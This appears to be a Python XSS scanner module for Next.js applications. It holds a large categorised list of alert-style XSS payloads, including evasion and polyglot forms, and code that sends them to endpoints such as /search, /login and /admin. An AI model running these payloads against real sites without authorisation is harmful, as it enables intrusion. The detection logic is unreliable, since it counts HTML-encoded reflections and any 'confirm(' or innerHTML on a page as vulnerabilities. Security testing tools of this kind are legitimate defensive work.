"""
XSS Scanner Module - Comprehensive XSS Testing
Optimized for Next.js applications with known vulnerable endpoints
"""

import re
import requests
import urllib.parse
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from rich.console import Console
from rich.table import Table
from bs4 import BeautifulSoup

console = Console()

# ============================================================================
# COMPREHENSIVE XSS PAYLOADS - Based on PayloadsAllTheThings
# ============================================================================

XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
    ],
    "html": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<div onmouseover=alert(1)>hover</div>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    ],
    "events": [
        "onload=alert(1)",
        "onerror=alert(1)",
        "onclick=alert(1)",
        "onmouseover=alert(1)",
        "onmouseenter=alert(1)",
        "onkeydown=alert(1)",
        "onfocus=alert(1)",
        "onblur=alert(1)",
        "onchange=alert(1)",
        "onsubmit=alert(1)",
        "onreset=alert(1)",
        "onselect=alert(1)",
        "onabort=alert(1)",
        "onunload=alert(1)",
        "onbeforeunload=alert(1)",
        "onresize=alert(1)",
        "onscroll=alert(1)",
    ],
    "javascript": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:alert('XSS')",
        "javascript:prompt(1)",
        "javascript:confirm(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
    "polyglots": [
        "javascript:alert(1)//<script>alert(1)</script>",
        "\" onload=alert(1)>",
        "'>\"<script>alert(1)</script>",
        "'>'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        "';alert(1);//",
        "\";alert(1);//",
        "-->alert(1)//",
        "//<script>alert(1)</script>",
    ],
    "dom": [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "?param=<script>alert(1)</script>",
        "#<svg onload=alert(1)>",
        "#<body onload=alert(1)>",
    ],
    "reflected": [
        "?q=<script>alert(1)</script>",
        "?search=<script>alert(1)</script>",
        "?query=<script>alert(1)</script>",
        "?id=<script>alert(1)</script>",
        "?page=<script>alert(1)</script>",
        "?user=<script>alert(1)</script>",
        "?username=<script>alert(1)</script>",
        "?name=<script>alert(1)</script>",
        "?email=<script>alert(1)</script>",
    ],
    "contextual": [
        "\"><script>alert(1)</script>",
        ">\"<script>alert(1)</script>",
        "\" onload=alert(1)>",
        "' onload=alert(1)>",
        "</script><script>alert(1)</script>",
        "';alert(1);//",
        "\";alert(1);//",
        "expression(alert(1))",
        "url(javascript:alert(1))",
    ],
    "evasion": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x onerror=alert(1)>",
        "<script >alert(1)</script>",
        "<img src=x onerror=alert(1) >",
        "%00<script>alert(1)</script>",
        "<scr%00ipt>alert(1)</scr%00ipt>",
        "<!--<script>alert(1)</script>-->",
        "<!--><script>alert(1)</script>-->",
        "\"<script>alert(1)</script>\"",
        "'<script>alert(1)</script>'",
    ],
}

# ============================================================================
# LEGACY XSS PARAMETERS - For backward compatibility with main.py
# ============================================================================

XSS_PARAMETERS = [
    "id", "user", "uid", "username", "email", "page",
    "file", "path", "url", "redirect", "return",
    "next", "token", "apikey", "search", "q",
    "query", "filter", "sort", "order", "lang",
    "debug", "name", "title", "content", "body",
    "search", "keyword", "keywords", "term", "category",
    "tag", "label", "user_id", "userid", "account_id",
    "profile_id", "post_id", "order_id", "invoice_id",
    "ticket_id", "project_id", "document_id", "item_id",
    "product_id", "category_id", "page_id", "comment_id",
    "redirect", "returnTo", "continue", "destination",
    "callback", "goto", "forward", "to", "target",
    "href", "link", "api_key", "access_token",
    "refresh_token", "client_id", "client_secret",
    "grant_type", "scope", "state", "nonce",
    "test", "dev", "staging", "sandbox", "admin",
    "root", "super", "master", "backup", "config",
    "settings", "profile", "account", "order",
    "invoice", "payment", "checkout",
]

# ============================================================================
# TARGETED PARAMETERS - Optimized for Next.js
# ============================================================================

TARGETED_PARAMETERS = [
    "q", "search", "query", "id", "user", "name",
    "username", "email", "page", "redirect", "url",
    "return", "next", "token", "apikey",
]

# ============================================================================
# TARGETED ENDPOINTS - Where XSS is likely to exist
# ============================================================================

TARGETED_ENDPOINTS = [
    "/search",
    "/login",
    "/profile",
    "/admin",
    "/upload",
    "/api/users",
]


class XSSScanner:
    """Optimized XSS Scanner for Next.js applications"""
    
    def __init__(self, target_url: str, timeout: int = 5):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.tested_params = set()
        self.vulnerable_params = set()
        self.tested_endpoints = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'ATT4ck-Surface-XSS-Scanner/2.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def scan(self) -> List[Dict]:
        """Run targeted XSS scan"""
        console.print(f"[cyan]🔍 Scanning for XSS vulnerabilities on: {self.target_url}[/cyan]")
        console.print("[dim]Using targeted approach for Next.js applications[/dim]")
        
        # 1. Test search/reflected XSS endpoints
        self._test_reflected_xss()
        
        # 2. Test DOM-based XSS
        self._test_dom_xss()
        
        # 3. Test URL parameters
        self._test_url_parameters()
        
        # 4. Test login page XSS
        self._test_login_xss()
        
        return self.findings
    
    def _test_reflected_xss(self):
        """Test for reflected XSS in search and other endpoints"""
        console.print("[cyan]Testing reflected XSS...[/cyan]")
        
        # Test each endpoint with each payload
        for endpoint in TARGETED_ENDPOINTS:
            test_endpoint = f"{self.target_url}{endpoint}"
            
            # Check if endpoint exists
            try:
                resp = self.session.get(test_endpoint, timeout=3)
                if resp.status_code != 200:
                    continue
            except:
                continue
            
            console.print(f"[dim]Testing {endpoint}...[/dim]")
            
            # Use simple payloads first (faster)
            quick_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ]
            
            for payload in quick_payloads:
                # Test with common parameter names
                for param in ["q", "search", "query", "id", "page", "user"]:
                    test_url = f"{test_endpoint}?{param}={urllib.parse.quote(payload)}"
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        if self._check_xss(response.text, payload):
                            self._add_finding(
                                endpoint=endpoint,
                                parameter=param,
                                payload=payload,
                                technique="Reflected XSS",
                                test_url=test_url,
                                confidence=95
                            )
                            console.print(f"[red]✗ Reflected XSS found in {endpoint}?{param}={payload[:20]}[/red]")
                            break
                    except:
                        pass
                if self._is_param_vulnerable(endpoint):
                    break
    
    def _test_dom_xss(self):
        """Test for DOM-based XSS via URL fragments"""
        console.print("[cyan]Testing DOM-based XSS...[/cyan]")
        
        dom_payloads = [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "#<svg onload=alert(1)>",
            "#<body onload=alert(1)>",
            "javascript:alert(1)",
        ]
        
        for payload in dom_payloads:
            test_url = f"{self.target_url}{payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for DOM XSS patterns in response
                dom_patterns = [
                    r'document\.write',
                    r'\.innerHTML\s*=',
                    r'\.outerHTML\s*=',
                    r'\.insertAdjacentHTML',
                    r'dangerouslySetInnerHTML',
                    r'eval\s*\(',
                    r'Function\s*\(',
                ]
                
                for pattern in dom_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self._add_finding(
                            endpoint="/#",
                            parameter="hash",
                            payload=payload,
                            technique="DOM-based XSS",
                            test_url=test_url,
                            confidence=80
                        )
                        console.print(f"[red]✗ DOM XSS vector found: {payload[:30]}[/red]")
                        break
            except:
                pass
    
    def _test_url_parameters(self):
        """Test URL parameters for XSS - only on vulnerable endpoints"""
        console.print("[cyan]Testing URL parameters...[/cyan]")
        
        # Only test parameters on pages that exist
        for endpoint in TARGETED_ENDPOINTS:
            test_endpoint = f"{self.target_url}{endpoint}"
            
            # Check if endpoint exists
            try:
                resp = self.session.get(test_endpoint, timeout=3)
                if resp.status_code != 200:
                    continue
            except:
                continue
            
            # Test each parameter with each payload
            for param in TARGETED_PARAMETERS[:5]:  # Limit to 5 params per endpoint
                if f"{endpoint}:{param}" in self.tested_params:
                    continue
                self.tested_params.add(f"{endpoint}:{param}")
                
                # Test with quick payloads
                for payload in XSS_PAYLOADS["basic"][:3]:
                    test_url = f"{test_endpoint}?{param}={urllib.parse.quote(payload)}"
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        if self._check_xss(response.text, payload):
                            self._add_finding(
                                endpoint=endpoint,
                                parameter=param,
                                payload=payload,
                                technique="Parameter XSS",
                                test_url=test_url,
                                confidence=90
                            )
                            console.print(f"[red]✗ XSS in {endpoint}?{param}={payload[:20]}[/red]")
                            break
                    except:
                        pass
    
    def _test_login_xss(self):
        """Test login page for XSS"""
        console.print("[cyan]Testing login page XSS...[/cyan]")
        
        login_url = f"{self.target_url}/login"
        
        # Check if login exists
        try:
            resp = self.session.get(login_url, timeout=3)
            if resp.status_code != 200:
                return
        except:
            return
        
        # Test login with XSS payloads in username
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            try:
                response = self.session.post(
                    login_url,
                    data={
                        'username': payload,
                        'password': 'test'
                    },
                    timeout=self.timeout
                )
                
                if self._check_xss(response.text, payload):
                    self._add_finding(
                        endpoint="/login",
                        parameter="username",
                        payload=payload,
                        technique="Stored XSS (Login)",
                        test_url=login_url,
                        confidence=85
                    )
                    console.print(f"[red]✗ XSS in login page: {payload[:30]}[/red]")
                    break
            except:
                pass
    
    def _check_xss(self, html: str, payload: str) -> bool:
        """Check if payload is reflected in HTML"""
        # Check exact payload
        if payload in html:
            return True
        
        # Check URL-encoded version
        encoded = urllib.parse.quote(payload)
        if encoded in html:
            return True
        
        # Check HTML-encoded version
        html_encoded = (
            payload.replace('<', '&lt;')
                   .replace('>', '&gt;')
                   .replace('"', '&quot;')
                   .replace("'", '&#39;')
        )
        if html_encoded in html:
            return True
        
        # Check for XSS indicators
        xss_indicators = [
            '<script>alert',
            'onerror=alert',
            'onload=alert',
            'javascript:alert',
            'confirm(',
            'prompt(',
        ]
        
        for indicator in xss_indicators:
            if indicator in html.lower():
                return True
        
        return False
    
    def _add_finding(self, endpoint: str, parameter: str, payload: str, 
                     technique: str, test_url: str, confidence: int):
        """Add a finding to the results"""
        finding = {
            "finding_id": f"XSS-{len(self.findings):03d}",
            "category": "xss",
            "name": f"XSS Vulnerability",
            "parameter": parameter,
            "payload": payload[:100],
            "url": test_url,
            "endpoint": endpoint,
            "severity": "CRITICAL",
            "confidence": confidence,
            "technique": technique,
            "description": f"XSS vulnerability found in {endpoint} parameter '{parameter}'",
            "timestamp": datetime.now().isoformat(),
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection"
        }
        
        # Check if this is a duplicate
        for existing in self.findings:
            if (existing.get('endpoint') == endpoint and 
                existing.get('parameter') == parameter and
                existing.get('payload') == payload):
                return
        
        self.findings.append(finding)
        self.vulnerable_params.add(f"{endpoint}:{parameter}")
    
    def _is_param_vulnerable(self, endpoint: str) -> bool:
        """Check if any parameter for this endpoint is vulnerable"""
        for param in self.vulnerable_params:
            if param.startswith(endpoint):
                return True
        return False
    
    def render_results(self):
        """Render XSS scan results"""
        if not self.findings:
            console.print("\n[green]✅ No XSS vulnerabilities found![/green]")
            return
        
        console.print(f"\n[bold red]🔥 XSS Vulnerabilities Found: {len(self.findings)}[/bold red]")
        
        table = Table(title="XSS Scan Results", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Technique", style="cyan", width=18)
        table.add_column("Endpoint", style="yellow", width=15)
        table.add_column("Parameter", style="green", width=12)
        table.add_column("Payload", style="red", width=35)
        table.add_column("Confidence", style="white", width=12)
        
        for f in self.findings:
            table.add_row(
                f.get('finding_id', 'N/A')[:6],
                f.get('technique', 'N/A')[:16],
                f.get('endpoint', 'N/A')[:13],
                f.get('parameter', 'N/A')[:10],
                f.get('payload', 'N/A')[:33],
                f"{f.get('confidence', 0)}%"
            )
        
        console.print(table)
        
        # Summary
        summary = self.get_summary()
        console.print(f"\n[bold]📊 Scan Summary:[/bold]")
        console.print(f"  • Total Findings: {summary['total_findings']}")
        console.print(f"  • Vulnerable Parameters: {len(summary['vulnerable_params'])}")
        console.print(f"  • Tested Parameters: {summary['tested_params']}")
        console.print(f"  • Critical Findings: {summary['findings_by_severity']['CRITICAL']}")
    
    def get_summary(self) -> Dict:
        """Get scan summary"""
        return {
            "total_findings": len(self.findings),
            "vulnerable_params": list(self.vulnerable_params),
            "tested_params": len(self.tested_params),
            "findings_by_severity": {
                "CRITICAL": len([f for f in self.findings if f.get('severity') == 'CRITICAL']),
                "HIGH": len([f for f in self.findings if f.get('severity') == 'HIGH']),
            }
        }